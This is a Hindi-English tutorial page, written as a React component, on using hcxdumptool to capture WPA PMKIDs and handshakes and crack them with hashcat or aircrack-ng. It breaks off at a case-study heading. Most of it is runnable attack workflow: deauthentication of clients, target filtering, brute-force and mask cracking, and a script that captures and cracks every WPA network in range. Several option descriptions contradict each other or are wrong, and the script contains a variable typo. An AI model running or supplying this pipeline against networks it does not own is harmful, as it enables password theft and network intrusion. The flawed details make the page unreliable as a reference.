import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Hcxdumptool() {
  return (
    <TutorialLayout
      title="hcxdumptool"
      subtitle="PMKID कैप्चर टूल — बिना क्लाइंट के वाईफाई पासवर्ड क्रैक"
      icon="📡"
      prev={{ to: '/tool/proxychains', label: 'proxychains' }}
      next={{ to: '/tool/eaphammer', label: 'eaphammer' }}
    >
      <h2>What is Hcxdumptool?</h2>
      <p>
        hcxdumptool एक powerful WiFi packet capture tool है जो WPA/WPA2/WPA3 के PMKID (Pairwise Master Key Identifier) को कैप्चर करता है — बिना किसी connected client के। Traditional WPA handshake attack में किसी डिवाइस का connected होना ज़रूरी है, लेकिन PMKID attack में यह ज़रूरत नहीं। आप सीधे access point से PMKID कैप्चर कर सकते हो। यह WiFi penetration testing में सबसे तेज़ और efficient method है — कुछ ही सेकंड्स में hash capture हो जाता है।
      </p>
      <p>
        hcxdumptool ZerBea (GitHub पर) ने बनाया है। यह C भाषा में लिखा गया है और Linux kernel के raw socket interface का इस्तेमाल करता है। यह tool monitor mode WiFi adapter से directly packet send/receive करता है — NetworkManager या wpa_supplicant की ज़रूरत नहीं। hcxdumptool hcxtools suite का core tool है जिसमें hcxpcapngtool (format converter), hcxpsktool (PSK generator), hcxhash2cap (hash to pcap converter), और कई अन्य tools शामिल हैं। यह suite WiFi security testing को पूरी तरह automate करती है।
      </p>
      <p>
        PMKID attack 2018 में discover हुआ — hashcat developer Jens "atom" Steube ने पता लगाया कि राउटर EAPOL frame में PMKID भेजता है जिसे कैप्चर करके offline crack किया जा सकता है। यह discovery WiFi security की दुनिया में game-changer थी क्योंकि अब client-less attack possible हो गया। hcxdumptool इसी attack को efficiently execute करने के लिए बनाया गया।
      </p>
      <p>
        hcxdumptool सिर्फ PMKID capture नहीं करता — यह traditional WPA/WPA2 handshake भी capture कर सकता है, deauthentication frames भेज सकता है, active beacon frames generate कर सकता है, और client probing attacks भी कर सकता है। यह एक comprehensive WiFi attack toolkit है जो raw packet level पर काम करता है। इसका direct kernel access इसे अन्य tools से ज़्यादा powerful बनाता है।
      </p>
      <p>
        hcxdumptool का design philosophy simple है — minimum overhead, maximum effectiveness। यह Python या Perl में नहीं बल्कि pure C में लिखा गया है जो इसे बहुत fast बनाता है। WiFi adapter को directly kernel level पर control करने के कारण यह अन्य tools से ज़्यादा reliable है। Kali Linux और Nethunter में यह pre-installed आता है और WiFi security professionals का favorite tool है।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> hcxdumptool केवल अपने वाईफाई नेटवर्क पर ही इस्तेमाल करें। बिना अनुमति के किसी भी वाईफाई नेटवर्क पर PMKID attack अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत इसमें 3 साल तक की जेल और 2 लाख तक का जुर्माना हो सकता है। केवल शैक्षिक उद्देश्यों और authorized penetration testing के लिए ही इसका उपयोग करें।
      </div>

      <h2>History of Hcxdumptool</h2>
      <p>
        hcxdumptool को ZerBea (real name ज्ञात नहीं) ने 2018 में बनाया था जब PMKID attack discover हुआ। उससे पहले WPA cracking के लिए aircrack-ng suite standard था, लेकिन PMKID के लिए dedicated tool चाहिए था। ZerBea ने देखा कि existing tools PMKID capture efficiently नहीं कर पा रहे थे — इसलिए उन्होंने scratch से hcxdumptool बनाया।
      </p>
      <p>
        PMKID attack Jens Steube (hashcat developer) ने January 2018 में discover किया। उन्होंने पाया कि access point EAPOL frame में PMKID include करता है जो password से derived होता है। यह discovery WiFi security world में game-changer थी — पहली बार client-less WPA attack possible हुआ। hcxdumptool इस attack को implement करने वाला पहला dedicated tool बना।
      </p>
      <p>
        2018 में PMKID attack discover होने के बाद WiFi security community में हलचल मच गई। यह पहला client-less WPA attack था — बिना किसी device के connected हुए password crack करना possible हो गया। hcxdumptool इस attack को implement करने वाला पहला dedicated tool था। GitHub पर release होने के बाद यह तुरंत popular हो गया।
      </p>
      <p>
        hcxdumptool hcxtools suite का core tool है। hcxtools में hcxpcapngtool (pcapng to hashcat format converter), hcxpsktool (PSK generator), hcxhash2cap (hash to pcap converter), hcxwltool (wordlist generator), और कई अन्य tools शामिल हैं। यह पूरा suite WiFi security testing के लिए one-stop solution है। GitHub पर 2000+ stars हैं और actively maintained है।
      </p>
      <p>
        hcxdumptool ka design raw sockets पर based है — Linux kernel directly WiFi frames send/receive करता है। यह approach NetworkManager और wpa_supplicant को bypass करता है — monitor mode WiFi adapter directly hcxdumptool control करता है। यही कारण है कि hcxdumptool इतना fast और reliable है — कोई middleware नहीं, direct kernel access।
      </p>
      <p>
        ZerBea actively hcxdumptool maintain करते हैं — new features, bug fixes, और kernel compatibility updates regularly release होते हैं। Linux kernel updates के साथ sometimes compatibility issues आते हैं — latest kernel headers और hcxdumptool version use करो। Community contributions भी welcome हैं — GitHub पर issues और pull requests actively address होते हैं।
      </p>

      <h2>How Hcxdumptool Works?</h2>
      <p>
        hcxdumptool raw socket level पर काम करता है — WiFi adapter को directly control करता है। यह NetworkManager और wpa_supplicant को completely bypass करता है और directly kernel के nl80211 interface use करता है। इसका मतलब है कि WiFi adapter पर पूरा control hcxdumptool के पास होता है — कोई भी अन्य process interfere नहीं कर सकता।
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Monitor Mode:</strong> WiFi adapter को monitor mode में set करता है — सभी WiFi frames capture होते हैं, सिर्फ अपने network के नहीं बल्कि सभी nearby networks के</li>
        <li><strong className="text-white">Active Injection:</strong> केवल capture नहीं करता — actively frames inject भी करता है। Authentication requests, deauth frames, beacon frames सब भेज सकता है</li>
        <li><strong className="text-white">PMKID Request:</strong> Access point को authentication request भेजता है — AP EAPOL frame में PMKID respond करता है जो password से derived होता है</li>
        <li><strong className="text-white">EAPOL Capture:</strong> EAPOL (Extensible Authentication Protocol over LAN) frames capture करता है — 4-way handshake के सभी frames</li>
        <li><strong className="text-white">Raw Socket Bypass:</strong> NetworkManager/wpa_supplicant को bypass करता है — direct kernel access से कोई interference नहीं</li>
        <li><strong className="text-white">Multi-Channel Hopping:</strong> Automatically channels hop करता है — सभी WiFi channels cover होते हैं (1-13 for 2.4GHz, 36-165 for 5GHz)</li>
        <li><strong className="text-white">Channel Hopping:</strong> Automatically सभी WiFi channels पर hop करता है — maximum coverage मिलती है</li>
        <li><strong className="text-white">Client Probing:</strong> Client devices को deauth भेजकर reconnect करवाता है — handshake capture होता है</li>
        <li><strong className="text-white">pcapng Output:</strong> Captured data pcapng format में save होता है — hcxpcapngtool से convert करके hashcat में crack करो</li>
      </ul>
      <p>
        hcxdumptool का internal architecture event-driven है। जब कोई WiFi frame आता है, तो hcxdumptool उसे analyze करता है और ज़रूरत के हिसाब से response भेजता है। अगर PMKID मिलता है तो immediately save कर लेता है। अगर EAPOL handshake detect होता है तो वो भी capture हो जाता है। यह सब process milliseconds में होता है।
      </p>

      <h2>Installation</h2>
      <p>
        काली नेटहंटर में hcxdumptool पहले से इंस्टॉल्ड आता है। अगर नहीं है तो कई तरीकों से इंस्टॉल कर सकते हो। hcxtools suite के साथ install करना recommended है क्योंकि hcxpcapngtool conversion के लिए ज़रूरी है।
      </p>
      <p>
        hcxdumptool compile from source recommended है — latest features और bug fixes मिलते हैं। apt repository में version पुराना हो सकता है। Source compile करने के लिए Linux kernel headers चाहिए — apt install linux-headers-$(uname -r) से install करो। WiFi adapter drivers भी properly install होने चाहिए — Realtek/Alfa adapters के लिए specific drivers compile करने पड़ सकते हैं।
      </p>
      <CodeBlock
        title="hcxdumptool इंस्टॉलेशन"
        code={`# काली लिनक्स/नेटहंटर में (पहले से है चेक करें):
hcxdumptool --version

# Debian/Ubuntu में इंस्टॉल:
sudo apt update
sudo apt install hcxdumptool hcxtools

# सोर्स से (सबसे लेटेस्ट):
git clone https://github.com/ZerBea/hcxtools.git
cd hcxtools
make
sudo make install

# Docker से:
docker pull ghcr.io/zbea/hcxtools
docker run -it --privileged ghcr.io/zbea/hcxtools hcxdumptool --version

# वर्जन चेक:
hcxdumptool --version
hcxpcapngtool --version

# सभी hcxtools commands देखें:
ls /usr/bin/hcx*`}
      />

      <h2>Basic Usage</h2>
      <p>
        PMKID capture के लिए monitor mode adapter चाहिए। पहले interface setup करो, फिर capture start करो। hcxdumptool automatically channel hopping करता है और सभी nearby access points scan करता है।
      </p>
      <CodeBlock
        title="PMKID Capture"
        code={`# मॉनिटर मोड इनेबल करें:
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# PMKID capture start करें:
sudo hcxdumptool -i wlan0 -o capture.pcapng

# Ctrl+C से stop करें जब PMKID मिल जाए

# स्टेटस दिखाओ (detailed output):
sudo hcxdumptool -i wlan0 -o capture.pcapng --enable_status=1

# टाइम लिमिट (60 सेकंड):
sudo hcxdumptool -i wlan0 -o capture.pcapng --stop_client_m2_assocs=60

# सभी channels scan (default):
sudo hcxdumptool -i wlan0 -o capture.pcapng --enable_status=1

# Specific channel:
sudo hcxdumptool -i wlan0 -o capture.pcapng --channel=6

# Multiple channels:
sudo hcxdumptool -i wlan0 -o capture.pcapng --channel=1,6,11`}
      />

      <h2>Important Options</h2>
      <p>
        hcxdumptool के options control करते हैं कि tool कैसे behave करे — channel selection, filtering, output format, और attack behavior। सही options set करने से faster results मिलते हैं और detection risk कम होता है। Production environments में options carefully choose करो — aggressive options (deauth) IDS trigger कर सकते हैं।
      </p>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Option</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">उदाहरण</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-i interface</td><td className="py-2 px-3">Monitor mode WiFi interface specify करें</td><td className="py-2 px-3 font-mono text-xs">-i wlan0</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-o file</td><td className="py-2 px-3">Output pcapng file path</td><td className="py-2 px-3 font-mono text-xs">-o capture.pcapng</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--filterlist_ap</td><td className="py-2 px-3">Target BSSID filter list file</td><td className="py-2 px-3 font-mono text-xs">--filterlist_ap=targets.txt</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--filterlist_client</td><td className="py-2 px-3">Target client MAC filter file</td><td className="py-2 px-3 font-mono text-xs">--filterlist_client=clients.txt</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--filtermode=2</td><td className="py-2 px-3">सिर्फ filter list के targets पर attack</td><td className="py-2 px-3 font-mono text-xs">--filtermode=2</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--enable_status</td><td className="py-2 px-3">Status output level (1-7)</td><td className="py-2 px-3 font-mono text-xs">--enable_status=1</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--active_beacon</td><td className="py-2 px-3">Active beacon frames send करें</td><td className="py-2 px-3 font-mono text-xs">--active_beacon</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--disable_deauthentication</td><td className="py-2 px-3">Deauth frames disable करें (stealthy)</td><td className="py-2 px-3 font-mono text-xs">--disable_deauthentication=1</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--stop_client_m2_assocs</td><td className="py-2 px-3">Capture duration (seconds)</td><td className="py-2 px-3 font-mono text-xs">--stop_client_m2_assocs=120</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--essidlist</td><td className="py-2 px-3">ESSID filter list file</td><td className="py-2 px-3 font-mono text-xs">--essidlist=essids.txt</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--channel</td><td className="py-2 px-3">Specific channel(s) set करें</td><td className="py-2 px-3 font-mono text-xs">--channel=1,6,11</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--disable_client_octets</td><td className="py-2 px-3">Client fingerprinting disable</td><td className="py-2 px-3 font-mono text-xs">--disable_client_octets=1</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--prefix_outfile</td><td className="py-2 px-3">Output file prefix</td><td className="py-2 px-3 font-mono text-xs">--prefix_outfile=scan</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--tot</td><td className="py-2 px-3">Timeout (seconds)</td><td className="py-2 px-3 font-mono text-xs">--tot=60</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">-h</td><td className="py-2 px-3">Help — सभी options देखें</td><td className="py-2 px-3 font-mono text-xs">hcxdumptool -h</td></tr>
          </tbody>
        </table>
      </div>

      <h2>PMKID Attack (Detailed)</h2>
      <p>
        PMKID attack सबसे fast और reliable WiFi cracking method है — client की ज़रूरत नहीं। यह attack 2018 में discover हुआ जब Jens Steube (hashcat developer) ने पता लगाया कि access point authentication request के response में PMKID भेजता है। यह PMKID password से derived होता है इसलिए offline crack किया जा सकता है।
      </p>
      <p>
        PMKID कैसे बनता है — PMKID = HMAC-SHA1-128(PMK, "PMK Name", MAC_AP, MAC_STA)। यहाँ PMK = PBKDF2(password, SSID, 4096, 256)। मतलब PMKID directly password से derived होता है। अगर PMKID capture हो जाए तो hashcat brute force/dictionary attack से password crack कर सकता है — बिना network से connect हुए। यही PMKID attack की ताकत है।
      </p>
      <p>
        PMKID attack की success rate ~60% है — सभी APs PMKID support नहीं करते। कुछ manufacturers ने firmware updates से PMKID disable कर दिया है। WPA3-SAE PMKID attack completely prevent करता है। लेकिन जो APs WPA2 use कर रहे हैं उनमें से ज़्यादातर vulnerable हैं। PMKID fail होने पर traditional handshake capture fallback approach है।
      </p>
      <CodeBlock
        title="Complete PMKID Attack Workflow"
        code={`# स्टेप 1: WiFi adapter monitor mode में डालो:
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# ya manually:
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# स्टेप 2: hcxdumptool से PMKID capture:
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --enable_status=1
# कुछ सेकंड wait करो — PMKID मिल जाएगा
# Ctrl+C से stop करो

# स्टेप 3: Capture check करो (PMKID मिला?):
hcxpcapngtool pmkid_capture.pcapng --pmkid-eapol=pmkid_hash.txt
# अगर PMKID है तो hash file बनेगी

# स्टेप 4: hashcat से crack करो:
# WPA/WPA2 (mode 16800 — old format):
hashcat -m 16800 pmkid_hash.txt /usr/share/wordlists/rockyou.txt

# WPA/WPA2/WPA3 (mode 22000 — new standard):
hcxpcapngtool -o hash.hc22000 pmkid_capture.pcapng
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# स्टेप 5: पासवर्ड मिल जाएगा:
# hashcat output में password दिखेगा
# उदाहरण: hash.hc22000:WPA*02*...*password123`}
      />

      <h2>Handshake Capture</h2>
      <p>
        hcxdumptool PMKID के साथ-साथ traditional WPA 4-way handshake भी capture कर सकता है। Handshake capture के लिए client का connected होना ज़रूरी है, लेकिन hcxdumptool deauth frames भेजकर client को disconnect और reconnect करवा सकता है जिससे handshake capture हो जाता है।
      </p>
      <p>
        WPA 4-way handshake तब होता है जब client AP से connect करता है। यह handshake password से derived PMK verify करता है। Handshake capture करके offline crack किया जा सकता है — PMKID attack जैसा ही concept। Handshake capture PMKID से ज़्यादा reliable है (~95% success) लेकिन client required है।
      </p>
      <p>
        hcxdumptool deauth frames भेजकर active handshake capture कर सकता है। --disable_deauthentication=0 flag enable करने पर hcxdumptool clients को deauth भेजता है — clients disconnect होते हैं, reconnect करते हैं, और handshake capture हो जाता है। यह method aggressive है — IDS/IPS detect कर सकता है। Stealthier approach: passive capture, wait for natural reconnects।
      </p>
      <p>
        Best practice: पहले PMKID try करो (client-less, fast)। Fail होने पर handshake capture करो (active, reliable)। दोनों methods combine करने से maximum success rate मिलती है। hcxdumptool automatically दोनों capture करता है एक ही run में — PMKID और handshake दोनों pcapng file में save होते हैं।
      </p>
      <CodeBlock
        title="Handshake Capture Methods"
        code={`# Method 1: Passive handshake capture (wait for client):
sudo hcxdumptool -i wlan0mon -o handshake.pcapng --enable_status=1
# जब कोई client connect होगा → handshake capture होगा

# Method 2: Active deauth + handshake capture:
sudo hcxdumptool -i wlan0mon -o handshake.pcapng --disable_deauthentication=0
# Deauth frames भेजेगा → clients disconnect → reconnect → handshake capture

# Method 3: Specific target पर handshake:
echo "AA:BB:CC:DD:EE:FF" > target_bssid.txt
sudo hcxdumptool -i wlan0mon -o handshake.pcapng \\
    --filterlist_ap=target_bssid.txt \\
    --filtermode=2 \\
    --disable_deauthentication=0

# Method 4: ESSID-based target:
echo "TargetNetwork" > essids.txt
sudo hcxdumptool -i wlan0mon -o handshake.pcapng \\
    --essidlist=essids.txt \\
    --filtermode=2

# hcxpcapngtool से convert:
hcxpcapngtool -o handshake.hc22000 handshake.pcapng

# aircrack-ng से crack (alternative):
aircrack-ng handshake.pcapng -w /usr/share/wordlists/rockyou.txt`}
      />

      <h2>Filter Options</h2>
      <p>
        Specific targets पर focus करने के लिए filter options use करो — faster results मिलते हैं और noise कम होता है। Filter mode 2 सबसे restrictive है — सिर्फ listed targets पर attack होगा।
      </p>
      <p>
        Filter options दो modes में काम करते हैं — include (सिर्फ listed targets) और exclude (listed targets छोड़कर सब)। --filterlist_ap file में BSSIDs (MAC addresses) होते हैं — एक per line, colon-separated format (AA:BB:CC:DD:EE:FF)। --filtermode=1 include mode है, --filtermode=2 exclude mode। Target-specific testing के लिए include mode, broad scanning के लिए exclude mode use करो।
      </p>
      <p>
        --filterlist_client flag से specific clients target कर सकते हो। Client MAC addresses file में डालो — hcxdumptool सिर्फ उन clients से interact करेगा। यह stealthy approach है — minimal network disruption। --disable_ap_attacks=1 flag से AP attacks disable करो, सिर्फ client attacks करो। --disable_client_attacks=1 flag से client attacks disable करो, सिर्फ AP attacks करो। Target list dynamically generate कर सकते हो — airodump-ng scan results से BSSIDs extract करके filter file बनाओ।
      </p>
      <CodeBlock
        title="Target Filtering Techniques"
        code={`# BSSID filter file बनाओ:
echo "AA:BB:CC:DD:EE:FF" > targets.txt

# सिर्फ specific access point पर attack:
sudo hcxdumptool -i wlan0mon -o capture.pcapng \\
    --filterlist_ap=targets.txt --filtermode=2

# Multiple BSSIDs:
echo "AA:BB:CC:DD:EE:FF" > targets.txt
echo "11:22:33:44:55:66" >> targets.txt
echo "77:88:99:AA:BB:CC" >> targets.txt
sudo hcxdumptool -i wlan0mon -o capture.pcapng \\
    --filterlist_ap=targets.txt --filtermode=2

# ESSID filter (network name से):
echo "MyNetwork" > essids.txt
echo "OfficeWiFi" >> essids.txt
sudo hcxdumptool -i wlan0mon -o capture.pcapng \\
    --essidlist=essids.txt --filtermode=2

# Client filter (specific device):
echo "AA:BB:CC:DD:EE:FF" > clients.txt
sudo hcxdumptool -i wlan0mon -o capture.pcapng \\
    --filterlist_client=clients.txt

# Combined filter (AP + Client):
sudo hcxdumptool -i wlan0mon -o capture.pcapng \\
    --filterlist_ap=targets.txt \\
    --filterlist_client=clients.txt \\
    --filtermode=2

# Exclude specific APs:
# filtermode=1 = exclude listed BSSIDs`}
      />

      <h2>Output Formats and Conversion</h2>
      <p>
        hcxdumptool pcapng format में save करता है। hcxpcapngtool से various hashcat/john formats में convert कर सकते हो। New format (22000) recommended है — यह PMKID और handshake दोनों support करता है।
      </p>
      <p>
        hcxpcapngtool capture file analyze करके detailed statistics देता है — कितने PMKIDs, handshakes, ESSIDs, BSSIDs captured हुए। --info=0 flag से per-hash details मिलती हैं — hash type, BSSID, ESSID, timestamp। --all flag से incomplete hashes भी extract होते हैं जो cracking के लिए useful नहीं होते। Production use में सिर्फ valid hashes use करो — incomplete hashes false confidence देते हैं।
      </p>
      <p>
        pcapng file Wireshark में भी open होती है — raw WiFi frames analyze कर सकते हो। EAPOL frames (authentication handshake) visually examine करो — PMKID field identify करो। Wireshark filter "eapol" से सिर्फ authentication frames दिखेंगे। यह debugging के लिए useful है — capture successful हुई या नहीं verify करने के लिए।
      </p>
      <CodeBlock
        title="Format Conversion"
        code={`# pcapng → hashcat mode 16800 (PMKID only — old format):
hcxpcapngtool capture.pcapng -o hash_16800.txt
hashcat -m 16800 hash_16800.txt wordlist.txt

# pcapng → hashcat mode 22000 (new standard — PMKID + handshake):
hcxpcapngtool -o hash_22000.hc22000 capture.pcapng
hashcat -m 22000 hash_22000.hc22000 wordlist.txt

# pcapng → EAPOL log (detailed info):
hcxpcapngtool capture.pcapng -e essid_list.txt

# pcapng → john format:
hcxpcapngtool capture.pcapng -o hash_john.txt
john --wordlist=wordlist.txt hash_john.txt

# Conversion info देखें:
hcxpcapngtool capture.pcapng --info=0

# Multiple capture files merge करो:
hcxpcapngtool -o merged.hc22000 capture1.pcapng capture2.pcapng capture3.pcapng

# PMKID count check:
hcxpcapngtool capture.pcapng | grep "PMKID"

# Handshake count check:
hcxpcapngtool capture.pcapng | grep "EAPOL"`}
      />

      <h2>Hashcat Integration</h2>
      <p>
        hcxdumptool + hcxpcapngtool + hashcat = complete WiFi cracking pipeline। तीन commands में पूरा attack complete हो जाता है — capture, convert, crack। hashcat GPU acceleration use करता है इसलिए बहुत fast cracking होती है।
      </p>
      <CodeBlock
        title="Complete Hashcat Workflow"
        code={`# पूरा workflow (3 commands):

# 1. Capture PMKID/handshake:
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# 2. Convert to hashcat format:
hcxpcapngtool -o hash.hc22000 capture.pcapng

# 3. Crack:
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Advanced hashcat attacks:

# Rule-based attack:
hashcat -m 22000 hash.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force (8 characters, all printable):
hashcat -m 22000 hash.hc22000 -a 3 ?a?a?a?a?a?a?a?a

# Mask attack (word + 4 digits):
hashcat -m 22000 hash.hc22000 -a 6 wordlist.txt ?d?d?d?d

# Hybrid (digits + word):
hashcat -m 22000 hash.hc22000 -a 7 ?d?d?d?d wordlist.txt

# Resume cracked session:
hashcat -m 22000 hash.hc22000 --session=wifi --restore

# Show cracked passwords:
hashcat -m 22000 hash.hc22000 --show

# GPU benchmark:
hashcat -b -m 22000`}
      />

      <h2>Aircrack-ng Integration</h2>
      <p>
        hcxdumptool captures और aircrack-ng cracking — alternative approach जब hashcat GPU available न हो। aircrack-ng CPU-based cracking करता है जो slower है लेकिन हर system पर काम करता है।
      </p>
      <CodeBlock
        title="Aircrack-ng Workflow"
        code={`# hcxdumptool से capture:
sudo hcxdumptool -i wlan0mon -o capture.pcapng

# aircrack-ng से crack (dictionary attack):
aircrack-ng capture.pcapng -w /usr/share/wordlists/rockyou.txt

# PMKID specific:
# aircrack-ng automatically PMKID detect करता है pcapng में

# Multiple capture files:
aircrack-ng capture1.pcapng capture2.pcapng -w wordlist.txt

# Specific BSSID crack:
aircrack-ng -b AA:BB:CC:DD:EE:FF capture.pcapng -w wordlist.txt

# Wordlist + rules:
aircrack-ng capture.pcapng -w wordlist.txt -r rules/best64.rule`}
      />

      <h2>PMKID vs Handshake Comparison</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">PMKID Attack</th>
              <th className="text-left py-2 px-3 text-neon-green">Handshake Attack</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Client Required</td><td className="py-2 px-3">नहीं — client-less attack</td><td className="py-2 px-3">हाँ — connected device ज़रूरी</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Speed</td><td className="py-2 px-3">तुरंत (seconds में)</td><td className="py-2 px-3">इंतज़ार (minutes लग सकते हैं)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Hashcat Mode</td><td className="py-2 px-3">16800 / 22000</td><td className="py-2 px-3">2500 / 22000</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Detection Risk</td><td className="py-2 px-3">कम (passive-like behavior)</td><td className="py-2 px-3">ज़्यादा (deauth frames detect होते हैं)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Success Rate</td><td className="py-2 px-3">~60% APs (PMKID enabled)</td><td className="py-2 px-3">~95% (with active client)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Stealth Level</td><td className="py-2 px-3">Medium — authentication request visible</td><td className="py-2 px-3">Low — deauth frames very visible</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Best Tool</td><td className="py-2 px-3">hcxdumptool</td><td className="py-2 px-3">airodump-ng + aireplay-ng</td></tr>
            <tr><td className="py-2 px-3 text-white">Recommended Approach</td><td className="py-2 px-3">पहले PMKID try करो</td><td className="py-2 px-3">PMKID fail हो तो handshake try करो</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Scripting and Automation</h2>
      <CodeBlock
        title="Automated WiFi Audit Script"
        code={`#!/bin/bash
# Automated PMKID capture + crack script
# Usage: sudo ./wifi_audit.sh

INTERFACE="wlan0mon"
OUTPUT_DIR="/tmp/wifi_audit"
WORDLIST="/usr/share/wordlists/rockyou.txt"
mkdir -p $OUTPUT_DIR

echo "[+] WiFi audit start..."
echo "[+] Interface: $INTERFACE"

# Monitor mode:
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Scan networks (30 seconds):
echo "[+] Scanning networks..."
timeout 30 sudo airodump-ng $INTERFACE --write $OUTPUT_DIR/scan --output-format csv

# Targets parse करो (WPA networks):
grep -a "WPA" $OUTPUT_DIR/scan-01.csv | awk -F',' '{print $1}' | sort -u > $OUTPUT_DIR/targets.txt
echo "[+] Found $(wc -l < $OUTPUT_DIR/targets.txt) WPA targets"

# हर target के लिए PMKID capture:
while read bssid; do
    echo "[+] Target: $bssid"
    echo "$bssid" > $OUTPUT_DIR/target.txt

    # 60 seconds capture per target:
    timeout 60 sudo hcxdumptool -i $INTERFACE \\
        -o "$OUTPUT_DIR/$bssid.pcapng" \\
        --filterlist_ap=$OUTPUT_DIR/target.txt \\
        --filtermode=2 \\
        --enable_status=1

    # Convert to hashcat format:
    hcxpcapngtool -o "$OUTPUT_DIR/$bssid.hash" "$OUTPUT_DIR/$bssid.pcapng" 2>/dev/null

    # Quick crack attempt:
    if [ -s "$OUTPUT_DIR/$bssid.hash" ]; then
        echo "[!] Hash captured for $bssid"
        hashcat -m 22000 "$OUTPUT_DIR/$bssid.hash" $WORDlist --potfile-disable 2>/dev/null
    fi
done < $OUTPUT_DIR/targets.txt

echo "[+] Audit complete. Results in $OUTPUT_DIR/"`}
      />

      <CodeBlock
        title="Batch PMKID Capture Script"
        code={`#!/bin/bash
# Batch capture — multiple targets, auto-convert

INTERFACE="wlan0mon"
OUTPUT_DIR="/tmp/batch_capture"
mkdir -p $OUTPUT_DIR

# Monitor mode setup:
sudo ip link set $INTERFACE down
sudo iw dev $INTERFACE set type monitor
sudo ip link set $INTERFACE up

echo "[+] Starting batch capture..."

# Capture all PMKIDs in range (5 minutes):
sudo timeout 300 hcxdumptool -i $INTERFACE \\
    -o "$OUTPUT_DIR/all_captures.pcapng" \\
    --enable_status=1

# Convert all captures:
echo "[+] Converting captures..."
hcxpcapngtool -o "$OUTPUT_DIR/all_hashes.hc22000" "$OUTPUT_DIR/all_captures.pcapng"

# Count captured hashes:
HASH_COUNT=$(grep -c "WPA" "$OUTPUT_DIR/all_hashes.hc22000" 2>/dev/null || echo "0")
echo "[+] Captured $HASH_COUNT hashes"

# Split by target (individual files):
hcxpcapngtool -o "$OUTPUT_DIR/individual.hc22000" \\
    --all "$OUTPUT_DIR/all_captures.pcapng"

echo "[+] Batch capture complete"`}
      />

      <CodeBlock
        title="WiFi Monitor Script"
        code={`#!/bin/bash
# Continuous WiFi monitoring — alert on new APs

INTERFACE="wlan0mon"
LOG_FILE="/tmp/wifi_monitor.log"
KNOWN_APS="/tmp/known_aps.txt"

# Monitor mode:
sudo airmon-ng check kill
sudo airmon-ng start wlan0

echo "[+] WiFi monitoring started..."
echo "[+] Log: $LOG_FILE"

while true; do
    # Quick scan (10 seconds):
    timeout 10 sudo airodump-ng $INTERFACE --write /tmp/scan --output-format csv 2>/dev/null

    # Parse APs:
    CURRENT_APS=$(grep -a "WPA\|WEP\|OPN" /tmp/scan-01.csv | awk -F',' '{print $1"," $14}' | sort -u)

    # Check for new APs:
    while IFS= read -r ap; do
        if ! grep -q "$ap" "$KNOWN_APS" 2>/dev/null; then
            echo "[!] NEW AP DETECTED: $ap" | tee -a "$LOG_FILE"
            echo "$ap" >> "$KNOWN_APS"
        fi
    done <<< "$CURRENT_APS"

    # Cleanup:
    rm -f /tmp/scan-01.csv
    sleep 5
done`}
      />

      <h2>Real-World Case Studies</h2>
      <p>
        hcxdumptool real-world WiFi security testing में बहुत effective है। यहाँ practical scenarios हैं:
      </p>
      <p>
